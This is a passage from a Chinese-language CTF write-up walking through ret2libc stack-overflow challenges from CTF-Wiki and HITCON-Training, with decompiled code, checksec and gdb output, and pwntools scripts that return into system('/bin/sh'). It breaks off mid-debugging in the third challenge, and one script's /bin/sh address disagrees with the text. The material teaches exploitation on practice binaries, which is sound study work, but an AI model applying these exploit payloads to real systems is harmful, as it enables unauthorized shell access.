<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在main中明显的<code>gets</code>函数，直接可以栈溢出，之后其他没有可用信息了。<br>在secure函数中内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;shell!?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有后门，但是<code>system()</code>函数传参不对不能直接拿这个地址直接用。<br>在IDA中查询找字符串<code>/bin/sh</code>在rodata中地址是<code>0x08048720</code><br>在plt表中查询到<code>system()</code>函数的地址是<code>0x08048460</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048460                               ; [00000006 BYTES: COLLAPSED FUNCTION _system]</span><br></pre></td></tr></table></figure>
<h3 id="攻击思路-3"><a href="#攻击思路-3" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>采用system的plt地址来运行<code>system()</code>函数，通过程序内的字符串<code>/bin/sh</code>给函数进行传参。</p>
<h3 id="溢出长度-3"><a href="#溢出长度-3" class="headerlink" title="溢出长度"></a>溢出长度</h3><p>这里通过gdb动态调试来去看溢出长度</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────</span><br><span class="line">*EAX  0xffffcf3c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"> EBX  0xf7e23e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* <span class="string">&#x27;,=&quot;&#x27;</span> */</span><br><span class="line">*ECX  0xf7e258ac (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x8048690 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffcfa8 ◂— 0</span><br><span class="line"> ESP  0xffffcf20 —▸ 0xffffcf3c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">*EIP  0x8048683 (main+107) ◂— mov eax, 0</span><br></pre></td></tr></table></figure>
<p>这里溢出位数应该是0xa8-0x3c&#x3D;108，溢出位数应该还要+4，+4才是真正返回地址的位置。</p>
<h3 id="攻击脚本-1"><a href="#攻击脚本-1" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用地址</span></span><br><span class="line">system_plt = <span class="number">0x8048460</span></span><br><span class="line">binsh = <span class="number">0x8049720</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&quot;a&quot;</span> * <span class="number">112</span>, system_plt, <span class="string">b&quot;b&quot;</span> * <span class="number">4</span>, binsh])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>在脚本中plt地址后门还要再多溢出4字节，因为函数拿参数的时候都是他的上上个位置，上一个位置也就是这后面填充的4字节，他一般都是返回地址的位置，因为这里只需要执行<code>system()</code>所以不需要考虑这个返回地址的内容，填充垃圾数据即可。</p>
<h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><h3 id="题目来源-4"><a href="#题目来源-4" class="headerlink" title="题目来源"></a>题目来源</h3><p>下载位置： <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2</a><br>PS：内容来自于CTF-WIKI</p>
<h3 id="文件类型-4"><a href="#文件类型-4" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Kali)-[~/Desktop/PWN/ret2libc2]</span><br><span class="line">└─# file ret2libc2</span><br><span class="line">ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
<p>这是一个采用动态连接库编译的32位ELF文件</p>
<h3 id="软件防护-2"><a href="#软件防护-2" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Kali)-[~/Desktop/PWN/ret2libc2]</span><br><span class="line">└─# checksec ret2libc2</span><br><span class="line">[*] <span class="string">&#x27;/root/Desktop/PWN/ret2libc2/ret2libc2&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
<p>允许栈溢出，NX防护开启，PIE防护关闭</p>
<h3 id="IDA分析-4"><a href="#IDA分析-4" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>main函数内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What do you think ?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>gets函数很明显，肯定是要栈溢出，其他信息没多少，在函数列表中又找到一个<code>secure</code>函数，内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(&amp;unk_8048760, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;no_shell_QQ&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有<code>system</code>函数，但是里面的参数不是想要的，因为是动态链接库，可以直接掉system的plt，参数在f12中也没找到，这题重要的时候需要自己构建一个“&#x2F;bin&#x2F;sh”字符串，这个程序里因为是动态链接库，所有的运行函数都可以去调用，我们可以尝试使用gets函数自己构建一个，但是这得找程序中可以写的变量地址，在bss段中找到了一个<code>buf2</code>的变量，在bss中的变量都可写的，他的地址是<code>0x0804A080</code>。</p>
<h3 id="攻击思路-4"><a href="#攻击思路-4" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>使用<code>gets</code>函数把<code>/bin/sh</code>写入buf2,再把<code>buf2</code>传入<code>system</code>函数。</p>
<h3 id="溢出长度-4"><a href="#溢出长度-4" class="headerlink" title="溢出长度"></a>溢出长度</h3><p>使用gdb调式，内容如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────</span><br><span class="line">*EAX  0xffffd0ec ◂— &#x27;hello&#x27;</span><br><span class="line"> EBX  0xf7f9ee34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */</span><br><span class="line">*ECX  0xf7fa08ac (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80486d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffd158 ◂— 0</span><br><span class="line"> ESP  0xffffd0d0 —▸ 0xffffd0ec ◂— &#x27;hello&#x27;</span><br><span class="line">*EIP  0x80486bf (main+119) ◂— mov eax, 0</span><br></pre></td></tr></table></figure>
<p>栈溢出位数应该是0xd158-0xd0ec+4&#x3D;112</p>
<h3 id="攻击脚本-2"><a href="#攻击脚本-2" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用地址</span></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">buf2 = <span class="number">0x0804A080</span></span><br><span class="line">sh = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&quot;a&quot;</span> * <span class="number">112</span>, gets_plt,system_plt,buf2,buf2 ])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(sh)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>上面这个脚本只是一次性攻击脚本，就是说这个脚本只是适用于当前，单反多一个命令他都无法执行，下面给一个可以执行多次的脚本，就是真正可以一直操控程序执行流</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843D</span></span><br><span class="line">buf2 = <span class="number">0x804A080</span></span><br><span class="line">payload = flat([<span class="string">b&quot;a&quot;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0x0</span>, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>上面脚本多加了一个pop_ebx的内容，当执行完gets之后，他的栈和执行的过程是这样的<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250405153820.png"><br>执行完这一步就开始pop ebx了<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250405153844.png"><br>执行完pop_ebx之后顺带会把buf2弹出栈，走到system_plt，执行到这一步刚好也走到ret，一ret就执行到system了，后面也可以通过这个思路来去继续构造命令。</p>
<h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><h3 id="题目来源-5"><a href="#题目来源-5" class="headerlink" title="题目来源"></a>题目来源</h3><p>下载位置： <a target="_blank" rel="noopener" href="https://github.com/scwuaptx/HITCON-Training/blob/cb60f23e444a0639c3872f205dd28cb04190de16/LAB/lab4/ret2lib">https://github.com/scwuaptx/HITCON-Training/blob/cb60f23e444a0639c3872f205dd28cb04190de16/LAB/lab4/ret2lib</a><br>PS：内容来自于<img src="https://avatars.githubusercontent.com/u/3533327?s=48&v=4" alt="Owner avatar"><a target="_blank" rel="noopener" href="https://github.com/scwuaptx/HITCON-Training">HITCON-Training</a></p>
<h3 id="文件类型-5"><a href="#文件类型-5" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Kali)-[~/Desktop/PWN/ret2libc3]</span><br><span class="line">└─# file ret2lib</span><br><span class="line">ret2lib: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID\[sha1]=c74b2683d6d3b99439c3e04d6d81b233e6a3b1b6, not stripped</span><br></pre></td></tr></table></figure>
<p>动态链接库编译的ELF文件</p>
<h3 id="软件防护-3"><a href="#软件防护-3" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Kali)-[~/Desktop/PWN/ret2libc3]</span><br><span class="line">└─# checksec ret2lib</span><br><span class="line">[*] <span class="string">&#x27;/root/Desktop/PWN/ret2libc3/ret2lib&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<p>只是开启了NX防护<br>允许栈溢出，NX防护开启，PIE防护关闭</p>
<h3 id="IDA分析-5"><a href="#IDA分析-5" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>main函数内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> **v4; <span class="comment">// [esp+4h] [ebp-11Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+8h] [ebp-118h]</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">256</span>]; <span class="comment">// [esp+12h] [ebp-10Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [esp+112h] [ebp-Eh] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> **v8; <span class="comment">// [esp+11Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know return to library ?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to see in memory?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me an address (in dec) :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">10u</span>);</span><br><span class="line">  v8 = (<span class="type">const</span> <span class="type">void</span> **)strtol(buf, v4, v5);</span><br><span class="line">  See_something(v8);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Leave some message for me :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, src, <span class="number">0x100u</span>);</span><br><span class="line">  Print_message(src);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thanks you ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有一个问题，就是得绕过一个位置，那就是下面这两行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="type">char</span> **v4; <span class="comment">// [esp+4h] [ebp-11Ch]</span></span><br><span class="line"><span class="type">int</span> v5; <span class="comment">// [esp+8h] [ebp-118h]</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [esp+112h] [ebp-Eh] BYREF</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span> **v8; <span class="comment">// [esp+11Ch] [ebp-4h]</span></span><br><span class="line">......</span><br><span class="line">v8 = (<span class="type">const</span> <span class="type">void</span> **)strtol(buf, v4, v5);</span><br><span class="line">See_something(v8);</span><br></pre></td></tr></table></figure>
<p>其中<code>See_something</code>的内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">See_something</span><span class="params">(<span class="type">const</span> <span class="type">void</span> **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The content of the address : %p\n&quot;</span>, *a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>strtol</code>在这里的作用是把字符串转换为长整型，然后传给See_something函数，他拿到之后把他当作一个内存地址输出内容了，这里如果是输入的<code>buf2</code>内容不是数字会报错，如果输入的内容在程序中不是字符串或者说是不能通过<code>%p</code>输出出来那就会报错，绕过这两个才可以继续操作，后面的代码内容是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="type">char</span> src[<span class="number">256</span>]; <span class="comment">// [esp+12h] [ebp-10Eh] BYREF</span></span><br><span class="line">......</span><br><span class="line">read(<span class="number">0</span>, src, <span class="number">0x100u</span>);</span><br><span class="line">Print_message(src);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Thanks you ~&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>读了一<code>0x100</code>大小的数据，转换成10进制就是256大小，放到了src中，之后把这个src丢到了Print_message中，Print_message的内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">Print_message</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">56</span>]; <span class="comment">// [esp+10h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your message is : %s&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>栈溢出就发生在这个函数中，他竟然把src的内容复制到了dest中，dest这个大小只有56位，但是src的大小是256，这样就产生了栈溢出。</p>
<h3 id="攻击思路-5"><a href="#攻击思路-5" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>第一步绕过虽然可以使用随便一个地址进行绕过，但是他这里不是为了让单纯绕过的，因为是动态链接库运行的程序我们需要通过这个方法溢出一下真实的函数地址，然后计算便宜位置找到<code>system()</code>函数的位置。找到这个位置之后再根据提供的so文件计算出偏移地址，再根据本地的链接库和偏移的地址拿到真实的<code>system()</code>函数位置。拿到之后通过执行<code>sh</code>字符串拿到shell，<code>sh</code>字符串可以直接通过python中的elf.search来搜索，在程序本身是又sh相关的字符串的，位置是在<code>0x0804829A</code>,他是fflush函数的名字,他的后缀有<code>sh</code>字样。</p>
<h3 id="溢出长度-5"><a href="#溢出长度-5" class="headerlink" title="溢出长度"></a>溢出长度</h3><p>使用gdb进行调试，断点打开<code>Print_message</code>，让其一直运行到strcpy之后，再去查看dest到ebp的位数，gdb调试返回内容如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">n</span></span><br><span class="line">0x08048568 in Print_message ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0xffffcff0 ◂— &#x27;nihao\n&#x27;</span><br><span class="line"> EBX  0xf7f9ee34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */</span><br><span class="line"> ECX  0xffffd042 ◂— &#x27;nihao\n&#x27;</span><br><span class="line">*EDX  0xffffcff0 ◂— &#x27;nihao\n&#x27;</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x8048670 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffd028 —▸ 0xffffd158 ◂— 0</span><br><span class="line"> ESP  0xffffcfe0 —▸ 0xffffcff0 ◂— &#x27;nihao\n&#x27;</span><br><span class="line">*EIP  0x8048568 (Print_message+24) ◂— lea eax, [ebp - 0x38]</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x8048556 &lt;Print_message+6&gt;     mov    eax, dword ptr [ebp + 8]     EAX, [0xffffd030] =&gt; 0xffffd042 ◂— &#x27;nihao\n&#x27;</span><br><span class="line">   0x8048559 &lt;Print_message+9&gt;     mov    dword ptr [esp + 4], eax     [0xffffcfe4] =&gt; 0xffffd042 ◂— &#x27;nihao\n&#x27;</span><br><span class="line">   0x804855d &lt;Print_message+13&gt;    lea    eax, [ebp - 0x38]            EAX =&gt; 0xffffcff0 —▸ 0xf7f9e7a8 (_IO_file_jumps) ◂— 0</span><br><span class="line">   0x8048560 &lt;Print_message+16&gt;    mov    dword ptr [esp], eax         [0xffffcfe0] =&gt; 0xffffcff0 —▸ 0xf7f9e7a8 (_IO_file_jumps) ◂— 0</span><br><span class="line">   0x8048563 &lt;Print_message+19&gt;    call   strcpy@plt                  &lt;strcpy@plt&gt;</span><br><span class="line"></span><br><span class="line"> ► 0x8048568 &lt;Print_message+24&gt;    lea    eax, [ebp - 0x38]              EAX =&gt; 0xffffcff0 ◂— 0x6168696e (&#x27;niha&#x27;)</span><br><span class="line">   0x804856b &lt;Print_message+27&gt;    mov    dword ptr [esp + 4], eax       [0xffffcfe4] =&gt; 0xffffcff0 ◂— 0x6168696e (&#x27;niha&#x27;)</span><br><span class="line">   0x804856f &lt;Print_message+31&gt;    mov    dword ptr 